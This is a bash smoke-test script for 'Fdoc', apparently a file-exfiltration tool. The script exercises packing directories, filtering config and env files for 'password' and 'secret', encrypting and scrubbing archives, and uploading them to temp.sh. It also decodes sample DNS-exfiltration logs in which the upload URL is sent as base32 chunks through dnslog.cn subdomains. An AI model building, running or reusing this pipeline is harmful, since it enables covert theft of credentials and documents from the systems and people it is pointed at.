#!/usr/bin/env bash
# Smoke + regression for Fdoc (pack, flags, callback decode, optional online upload).
set -euo pipefail

ROOT="$(cd "$(dirname "$0")/.." && pwd)"
cd "$ROOT"

BIN="${BIN:-$ROOT/build/Fdoc-smoke}"
OUT="$ROOT/build/smoke-out"
SRC="$ROOT/testdata/manual/src"
DECODE="$ROOT/scripts/dnslog_decode.py"
PASS=0
FAIL=0
ONLINE="${ONLINE:-0}"

green() { printf '\033[32m%s\033[0m\n' "$*"; }
red() { printf '\033[31m%s\033[0m\n' "$*"; }
step() { printf '\n==> %s\n' "$*"; }

ok() { green "PASS: $*"; PASS=$((PASS + 1)); }
bad() { red "FAIL: $*"; FAIL=$((FAIL + 1)); }

assert_eq() {
  local want="$1" got="$2" msg="$3"
  if [[ "$got" == "$want" ]]; then
    ok "$msg (got=$got)"
  else
    bad "$msg (want=$want got=$got)"
  fi
}

assert_contains() {
  local hay="$1" needle="$2" msg="$3"
  if [[ "$hay" == *"$needle"* ]]; then
    ok "$msg"
  else
    bad "$msg (missing '$needle')"
  fi
}

cleanup() {
  rm -rf "$OUT"
  mkdir -p "$OUT" "$(dirname "$BIN")"
}
cleanup

step "0) third_party/uploader sync check (optional UPLOADER_SRC)"
UPLOADER_SRC="${UPLOADER_SRC:-}"
if [[ -z "$UPLOADER_SRC" && -d /Users/simon/Documents/tools/uploader ]]; then
  UPLOADER_SRC=/Users/simon/Documents/tools/uploader
fi
if [[ -n "$UPLOADER_SRC" && -d "$UPLOADER_SRC" ]]; then
  sync_paths=(
    apis/upload.go
    apis/encrypt_temp_test.go
    crypto/stream.go
    crypto/aes_test.go
    route/probe.go
    route/upload.go
    apis/methods/httpclient.go
    apis/methods/timeout_override.go
    apis/methods/timeout_override_test.go
  )
  sync_ok=1
  for rel in "${sync_paths[@]}"; do
    if [[ -f "$UPLOADER_SRC/$rel" && -f "$ROOT/third_party/uploader/$rel" ]]; then
      if ! diff -q "$UPLOADER_SRC/$rel" "$ROOT/third_party/uploader/$rel" >/dev/null; then
        bad "third_party drift: $rel (rsync from UPLOADER_SRC)"
        sync_ok=0
      fi
    fi
  done
  if [[ $sync_ok -eq 1 ]]; then
    ok "third_party key files match UPLOADER_SRC"
  fi
else
  ok "skip third_party sync check (set UPLOADER_SRC)"
fi

step "1) unit tests"
if go test ./...; then
  ok "go test ./..."
else
  bad "go test ./..."
fi

step "2) build binary"
if CGO_ENABLED=0 go build -trimpath -ldflags='-s -w' -o "$BIN" .; then
  ok "build $BIN"
else
  bad "build"
  echo "summary: $PASS passed, $FAIL failed"
  exit 1
fi

step "3) pack regression (local, no network)"
# 3a documents + skip dir
rm -f "$OUT/01-docs.tar.gz"
set +e
"$BIN" -d "$SRC" -x skipme -o "$OUT/01-docs.tar.gz" -q
ec=$?
set -e
assert_eq 0 "$ec" "pack documents exit"
if tar -tzf "$OUT/01-docs.tar.gz" | grep -q 'keep/report.pdf'; then
  ok "archive contains report.pdf"
else
  bad "archive missing report.pdf"
fi
if tar -tzf "$OUT/01-docs.tar.gz" | grep -q 'skipme/'; then
  bad "archive should not contain skipme/"
else
  ok "skipme excluded"
fi

# 3b size measure (tiny -max may truncate → exit 2; still prints totalSize)
set +e
size_out="$("$BIN" -d "$SRC" -e any -x skipme -max 100 -max-file 0 -size -q 2>&1)"
ec=$?
set -e
if [[ "$ec" -eq 0 || "$ec" -eq 2 ]]; then
  ok "size mode exit (got=$ec)"
else
  bad "size mode exit (want=0|2 got=$ec)"
fi
assert_contains "$size_out" "totalSize:" "size mode output"

# 3c truncate keep (exit 2)
rm -f "$OUT/trunc.tar.gz"
set +e
"$BIN" -d "$SRC" -e txt -x skipme -max 40 -max-file 0 -o "$OUT/trunc.tar.gz" -q
ec=$?
set -e
assert_eq 2 "$ec" "truncate exit 2"
if [[ -f "$OUT/trunc.tar.gz" ]]; then
  ok "truncated archive kept"
else
  bad "truncated archive missing"
fi

# 3d keyword filter
rm -f "$OUT/03-kw.tar.gz"
set +e
"$BIN" -d "$SRC" -e txt,ini,conf,env -x skipme -k password,secret -o "$OUT/03-kw.tar.gz" -q
ec=$?
set -e
assert_eq 0 "$ec" "keyword pack exit"

step "4) upload flag validation (no network)"
set +e
err="$("$BIN" -d "$SRC" -x skipme -o "$OUT/no-cb.tar.gz" -upload -q 2>&1)"
ec=$?
set -e
# -upload alone is local-echo mode: must not fail flag validation for missing webhook/dns.
if echo "$err" | grep -Eiq 'requires -webhook|requires.*dns for result'; then
  bad "upload without callback should be allowed (got validation error)"
else
  ok "upload without webhook/dns allowed (local echo)"
fi
# Offline may fail at network upload (ec!=0) or succeed; either is fine for this check.

set +e
err="$("$BIN" -d "$SRC" -x skipme -size -upload -webhook http://127.0.0.1:9/ -q 2>&1)"
ec=$?
set -e
assert_eq 1 "$ec" "upload+size rejected"
assert_contains "$err" "-size" "error mentions -size"

step "5) DNS decode script (dnslog.cn + nested base)"
SAMPLE_CN=$(cat <<'EOF'
0-4-n5ydimt4knuw233omrsu2yldijxw62znkbzg6ltm.op42.ie0gyx.dnslog.cn	116.236.159.1	2026-07-20 10:05:00
1-4-n5rwc3d4nb2hi4dthixs65dfnvyc443if5sxi4lp.op42.ie0gyx.dnslog.cn	116.236.159.1	2026-07-20 10:05:00
2-4-kyxw65luob2xixzsgazdmmbxgiyf6mjqga4dgmjo.op42.ie0gyx.dnslog.cn	116.236.159.1	2026-07-20 10:05:00
3-4-orqxelthpi.op42.ie0gyx.dnslog.cn	116.236.159.1	2026-07-20 10:05:00
EOF
)
SAMPLE_UA=$(cat <<'EOF'
4	3-4-orqxelthpi.op42.8c2f0fe1.log.dnslog.pp.ua.	116.236.159.6:36162	2026-07-20 10:09:58
2	1-4-n5rwc3d4nb2hi4dthixs65dfnvyc443if5sxi4lp.op42.8c2f0fe1.log.dnslog.pp.ua.	116.236.159.38:34310	2026-07-20 10:09:58
1	2-4-kyxw65luob2xixzsgazdmmbxgiyf6mjqga4dgmjo.op42.8c2f0fe1.log.dnslog.pp.ua.	116.236.159.46:46451	2026-07-20 10:09:58
0	0-4-n5ydimt4knuw233omrsu2yldijxw62znkbzg6ltm.op42.8c2f0fe1.log.dnslog.pp.ua.	116.236.159.46:51175	2026-07-20 10:09:57
EOF
)

dec_cn="$(printf '%s\n' "$SAMPLE_CN" | python3 "$DECODE" -q)"
dec_ua="$(printf '%s\n' "$SAMPLE_UA" | python3 "$DECODE" -q)"
want_url="https://temp.sh/etqoV/output_20260720_100831.tar.gz"
assert_eq "$want_url" "$dec_cn" "decode dnslog.cn style"
assert_eq "$want_url" "$dec_ua" "decode nested dnslog.pp.ua table"

# incomplete set must fail
set +e
printf '%s\n' "$(printf '%s\n' "$SAMPLE_CN" | tail -n +2)" | python3 "$DECODE" -q >/dev/null 2>&1
ec=$?
set -e
assert_eq 1 "$ec" "decode incomplete chunks exits 1"

step "6) webhook callback smoke (local httptest via go test)"
if go test ./pkg/callback/ -run 'TestNotifyWebhook|TestDNSRoundTrip' -count=1; then
  ok "callback package smoke"
else
  bad "callback package smoke"
fi

step "7) scrub flag validation"
set +e
err="$("$BIN" -d "$SRC" -x skipme -o "$OUT/scrub-only.tar.gz" -scrub -q 2>&1)"
ec=$?
set -e
assert_eq 1 "$ec" "-scrub without -upload exits 1"
assert_contains "$err" "-upload" "error mentions -upload"

step "7a) encrypt flag validation"
set +e
err="$("$BIN" -d "$SRC" -x skipme -o "$OUT/enc-only.tar.gz" -encrypt -key x -q 2>&1)"
ec=$?
set -e
assert_eq 1 "$ec" "-encrypt without -upload exits 1"
assert_contains "$err" "-upload" "encrypt error mentions -upload"

step "7b) webhook http non-loopback rejected"
set +e
err="$("$BIN" -d "$SRC" -x skipme -o "$OUT/bad-wh.tar.gz" -upload -webhook http://example.com/h -q 2>&1)"
ec=$?
set -e
assert_eq 1 "$ec" "non-loopback http webhook rejected"
assert_contains "$err" "https" "error mentions https"

step "7c) decrypt subcommand roundtrip"
ENC_DIR="$OUT/decrypt-rt"
rm -rf "$ENC_DIR"
mkdir -p "$ENC_DIR"
printf 'Fdoc decrypt smoke payload\n' > "$ENC_DIR/plain.tgz"
cat > "$ENC_DIR/enc_helper.go" <<'EOF'
package main

import (
	"os"

	"uploader/crypto"
)

func main() {
	_, nk, err := crypto.NormalizeKey(os.Args[1], false)
	if err != nil {
		panic(err)
	}
	s, err := os.Open(os.Args[2])
	if err != nil {
		panic(err)
	}
	defer s.Close()
	d, err := os.Create(os.Args[3])
	if err != nil {
		panic(err)
	}
	defer d.Close()
	if err := crypto.StreamEncrypt(s, d, nk, 0); err != nil {
		panic(err)
	}
}
EOF
(
  cd "$ENC_DIR"
  go mod init fdoc_enc_helper >/dev/null
  printf 'replace uploader => %s\n' "$ROOT/third_party/uploader" >> go.mod
  go mod tidy >/dev/null
  go run . 'smoke-key' plain.tgz cipher.bin
)
set +e
err="$("$BIN" decrypt -key 'smoke-key' -o "$ENC_DIR/out.tgz" -force "$ENC_DIR/cipher.bin" 2>&1)"
ec=$?
set -e
assert_eq 0 "$ec" "decrypt exit"
assert_contains "$err" "DECRYPT_OK" "decrypt prints DECRYPT_OK"
if cmp -s "$ENC_DIR/plain.tgz" "$ENC_DIR/out.tgz"; then
  ok "decrypt roundtrip bytes"
else
  bad "decrypt roundtrip bytes mismatch"
fi
set +e
err="$("$BIN" decrypt -key 'smoke-key' -o "$ENC_DIR/bad.tgz" -force "$ENC_DIR/plain.tgz" 2>&1)"
ec=$?
set -e
assert_eq 1 "$ec" "decrypt rejects plaintext"

step "8) online upload smoke (optional ONLINE=1)"
if [[ "$ONLINE" == "1" ]]; then
  WH_LOG="$OUT/webhook.log"
  WH_PORT="${ONLINE_WEBHOOK_PORT:-18765}"
  rm -f "$OUT/online.tar.gz" "$WH_LOG"
  # Free leftover listeners from a previous interrupted run.
  if command -v lsof >/dev/null 2>&1; then
    pids="$(lsof -tiTCP:"$WH_PORT" -sTCP:LISTEN 2>/dev/null || true)"
    if [[ -n "$pids" ]]; then
      # shellcheck disable=SC2086
      kill $pids 2>/dev/null || true
      sleep 0.2
    fi
  fi
  python3 - "$WH_LOG" "$WH_PORT" <<'PY' &
import sys
from http.server import BaseHTTPRequestHandler, HTTPServer
path, port = sys.argv[1], int(sys.argv[2])
class H(BaseHTTPRequestHandler):
    def do_POST(self):
        n = int(self.headers.get("Content-Length", "0"))
        body = self.rfile.read(n)
        open(path, "wb").write(body)
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"ok")
    def log_message(self, *a):
        pass
httpd = HTTPServer(("127.0.0.1", port), H)
httpd.timeout = 120
httpd.handle_request()
PY
  WH_PID=$!
  sleep 0.4
  if ! kill -0 "$WH_PID" 2>/dev/null; then
    bad "webhook listener failed to start on :$WH_PORT"
  else
    set +e
    # Prefer auto backend (temp.sh may 403); pin via ONLINE_BACKEND=temp if needed.
    ONLINE_BACKEND="${ONLINE_BACKEND:-}"
    if [[ -n "$ONLINE_BACKEND" ]]; then
      "$BIN" -d "$SRC" -x skipme -e pdf -o "$OUT/online.tar.gz" -upload \
        -webhook "http://127.0.0.1:${WH_PORT}/hook" \
        -task-id smoke1 -b "$ONLINE_BACKEND" -q
    else
      "$BIN" -d "$SRC" -x skipme -e pdf -o "$OUT/online.tar.gz" -upload \
        -webhook "http://127.0.0.1:${WH_PORT}/hook" \
        -task-id smoke1 -q
    fi
    ec=$?
    set -e
    # Don't hang forever if upload failed and webhook never received a request.
    for _ in $(seq 1 20); do
      kill -0 "$WH_PID" 2>/dev/null || break
      sleep 0.25
    done
    kill "$WH_PID" 2>/dev/null || true
    wait "$WH_PID" 2>/dev/null || true
    if [[ "$ec" -eq 0 || "$ec" -eq 2 ]] && [[ -f "$WH_LOG" ]]; then
      if python3 -c "import json,sys; d=json.load(open(sys.argv[1])); assert d.get('url','').startswith('http'); assert d['task_id']=='smoke1'" "$WH_LOG"; then
        ok "online upload+webhook"
      else
        bad "webhook JSON invalid"
      fi
    else
      bad "online upload failed exit=$ec"
    fi
  fi
else
  ok "skip online (set ONLINE=1 to enable)"
fi

step "summary"
echo "passed=$PASS failed=$FAIL"
if [[ "$FAIL" -gt 0 ]]; then
  red "SMOKE/REGRESS FAILED"
  exit 1
fi
green "SMOKE/REGRESS OK"
